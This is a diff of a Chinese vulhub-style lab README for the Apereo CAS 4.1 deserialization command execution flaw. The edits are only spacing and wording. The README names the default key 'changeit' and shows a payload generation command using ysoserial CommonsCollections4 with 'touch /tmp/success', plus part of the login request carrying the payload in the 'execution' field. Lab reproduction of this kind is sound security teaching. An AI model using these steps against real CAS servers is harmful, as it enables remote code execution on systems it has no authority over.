@@ -1,6 +1,6 @@
 # Apereo CAS 4.1 反序列化命令执行漏洞
 
-Apereo CAS是一款Apereo发布的集中认证服务平台，常被用于企业内部单点登录系统。其4.1.7版本之前存在一处默认密钥的问题，利用这个默认密钥我们可以构造恶意信息触发目标反序列化漏洞，进而执行任意命令。
+Apereo CAS 是一款 Apereo 发布的集中认证服务平台，常被用于企业内部单点登录系统。其 4.1.7 版本之前存在一处默认密钥的问题，利用这个默认密钥我们可以构造恶意信息触发目标反序列化漏洞，进而执行任意命令。
 
 参考链接：
 
@@ -8,17 +8,17 @@ Apereo CAS是一款Apereo发布的集中认证服务平台，常被用于企业�
 
 ## 环境搭建
 
-执行如下命令启动一个Apereo CAS 4.1.5：
+执行如下命令启动一个 Apereo CAS 4.1.5：
 
 ```
-docker-compose up -d
+docker compose up -d
 ```
 
-环境启动后，访问`http://your-ip:8080/cas/login`即可查看到登录页面。
+环境启动后，访问 `http://your-ip:8080/cas/login` 即可查看到登录页面。
 
 ## 漏洞复现
 
-漏洞原理实际上是Webflow中使用了默认密钥`changeit`：
+漏洞原理实际上是 Webflow 中使用了默认密钥 `changeit`：
 
 ```java
 public class EncryptedTranscoder implements Transcoder {
@@ -38,7 +38,7 @@ public class EncryptedTranscoder implements Transcoder {
     // ...
 ```
 
-我们使用[Apereo-CAS-Attack](https://github.com/vulhub/Apereo-CAS-Attack)来复现这个漏洞。使用ysoserial的CommonsCollections4生成加密后的Payload：
+我们使用 [Apereo-CAS-Attack](https://github.com/vulhub/Apereo-CAS-Attack) 来复现这个漏洞。使用 ysoserial 的 CommonsCollections4 生成加密后的 Payload：
 
 ```
 java -jar apereo-cas-attack-1.0-SNAPSHOT-all.jar CommonsCollections4 "touch /tmp/success"
@@ -46,7 +46,7 @@ java -jar apereo-cas-attack-1.0-SNAPSHOT-all.jar CommonsCollections4 "touch /tmp
 
 ![](1.png)
 
-然后我们登录CAS并抓包，将Body中的`execution`值替换成上面生成的Payload发送：
+然后我们登录 CAS 并抓包，将 Body 中的 `execution` 值替换成上面生成的 Payload 发送：
 
 ```
 POST /cas/login HTTP/1.1
@@ -69,6 +69,6 @@ username=test&password=test&lt=LT-2-gs2epe7hUYofoq0gI21Cf6WZqMiJyj-cas01.example
 
 ![](2.png)
 
-登录Apereo CAS，可见`touch /tmp/success`已成功执行：
+登录 Apereo CAS，可见 `touch /tmp/success` 已成功执行：
 
 ![](3.png)
